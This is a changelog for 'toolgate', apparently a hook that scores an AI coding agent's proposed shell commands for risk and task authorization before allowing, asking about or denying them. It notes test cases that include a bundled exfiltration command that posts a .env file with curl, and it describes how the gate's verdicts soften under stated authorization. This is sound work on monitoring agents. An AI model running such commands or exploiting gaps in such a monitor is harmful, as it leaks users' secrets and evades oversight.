# Changelog

## 0.3.2
- Authorization now softens **per axis** and the strictest axis wins. Previously the `secret_exposure` floor only applied when it was the highest-scoring axis, so 0.98 destructive / 0.97 secret / 0.95 authorized produced `ask` instead of `deny`. Explanation names the axis that decided the verdict.
- Docs correction: run 2's "authorized leak" case never engaged softening (0.84 < the then-0.9 threshold); the floor is now exercised by replaying those scores in a unit test.
- Both from a fourth review by ChatGPT (GPT-6 Astra), run by Jaz, which also endorsed the 0.8 threshold on the run-2 evidence.

## 0.3.1
- Default `thresholds.authorized` 0.9 → 0.8. Across two live runs, explicitly requested actions scored 0.84–0.89 and unrelated ones 0.03–0.18; 0.9 was never reached, so the mitigator never fired. See docs/live-results-2026-09-18-b.md.

## 0.3.0
- New `secret_exposure` risk question (prints, persists, or commits credential values; ordinary authenticated use stays low). Authorization never softens it — a task asking for a leak does not make the leak fine.
- Latency split: `warm()` on backends; `latencyMs` is now the request alone and `setupMs` (SDK import) is reported separately in decisions and the audit log. Earlier reported latencies included the import.
- `scripts/live-check.sh` rewritten around the cases where authorization changes the verdict: explicit permission for the exact action, a general task that does not authorize it, right operation / wrong target, and an authorized action bundled with an unauthorized one (`vercel deploy --prod && curl -d @.env …`), plus a secret-exposure set.
- The bundled-command gap, the `secret_exposure` wording, the no-softening floor, and the latency-measurement critique came from a third review by ChatGPT (GPT-6 Astra), run by Jaz.

## 0.2.3
- First live Jev results (via Vercel AI Gateway): benign commands 0.01–0.02, `git push origin main` 0.16–0.19, `git push --force` 0.88 → deny. Observed latency ~0.85–1.0 s per call through the Gateway; first call timed out at 2.5 s. Default `timeout_ms` raised 2500 → 5000.
- README: latency claim corrected to what we measured; credits section.

## 0.2.2
- `toolgate check --task <text>` supplies task context so `off_task` and `authorized` are exercised.
- `scripts/live-check.sh`: one-line-per-command live smoke test against real Jev.

## 0.2.1
- Softening now requires task context, a real (unrounded) `authorized` answer at/above the threshold, and `off_task` below the ask threshold — conflicting judgments stay at `ask`.
- Missing authorization no longer passes a threshold of 0 (and no longer prints `NaN`).
- Default `thresholds.authorized` raised 0.5 → 0.9 until tuned on labeled data.
- Edge cases (missing-context × zero threshold, rounding before comparison, off_task/authorized conflict), the replacement check, and the 0.9 threshold recommendation came from an independent review by ChatGPT (GPT-6 Astra), run by Jaz.

## 0.2.0 — capability is not harm
- New `authorized` mitigator question; deny → ask and ask → allow when the stated task explicitly calls for the action. Nothing softens without task context.
- `exfiltration` no longer counts pushes to the project's own remote or deploys with its own tooling.
- Truncated input can never be allowed outright.
- Secrets redacted from state before it leaves the machine, not only in the audit log.
- The risk-vs-authorization critique that drove this release ("a 95% probability that something uploads data is not a 95% probability that it is harmful") came from an independent review by ChatGPT (GPT-6 Astra), run by Jaz.

## 0.1.2
- Lazy-load the AI SDK: static-rule and passthrough paths ~600 ms → ~90 ms.
- Linear-time `rm` rule on multi-megabyte input; stderr signal on fail-mode; TTY guard.

## 0.1.1
- Hardening after three independent audits: ReDoS fix, no per-project policy discovery, raw-value rule matching, `undefined`-free state, anchored matchers, merged (not replaced) user rules/questions, audit file permissions and redaction, bare-bin settings snippet (`npx toolgate` resolves to an unrelated package).

## 0.1.0
- Initial release: Claude Code PreToolUse hook backed by TypeSafe Jev via Vercel AI Gateway.
